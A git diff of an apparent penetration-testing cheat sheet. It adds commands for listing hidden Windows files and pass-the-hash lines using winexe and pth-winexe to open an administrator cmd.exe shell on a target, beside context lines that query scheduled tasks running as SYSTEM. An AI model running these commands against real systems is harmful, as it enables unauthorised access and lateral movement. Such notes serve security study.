@@ -62,6 +62,8 @@ automated tools
 
 Windows
 Hidden 
+	dir /r
+	dir -force
 scheduled tasks (schtasks, strat from top)
 schtasks /query /fo LIST /v
 schtasks /query /fo LIST /v | Select-String -Pattern "SYSTEM" -CaseSensitive -Context 5,0 | Select-String -Pattern "Task to Run"
@@ -1264,7 +1266,7 @@ Mongo use json format
             gdb
                Install peda
                   git clone https://github.com/longld/peda.git ~/peda
-                  echo "source ~/peda/peda.py" >> ~/.gdbinit
+                  echo "source ~/peda/peda.py" >> ~/.gdbinit 
                how to use
                   pdisass main     
                   pdiss <functionname>
@@ -1279,7 +1281,18 @@ r2 ./binary
 	 
 Hash
 https://hashcat.net/wiki/doku.php?id=example_hashes
+#with regular hash
+winexe -U jenkins/administrator //<ip> cmd.exe
+#with NTLM hash
+pth-winese -U jenkins/administrator //<ip> cmd.exe
+pth-winese -U jenkins/administrator%LM_manager:NTLMhash //<ip> cmd.exe
+
 kdbx - keepass2john
+
+
+
+
+
 
 11.	Extra info
 Reporting Frameworks
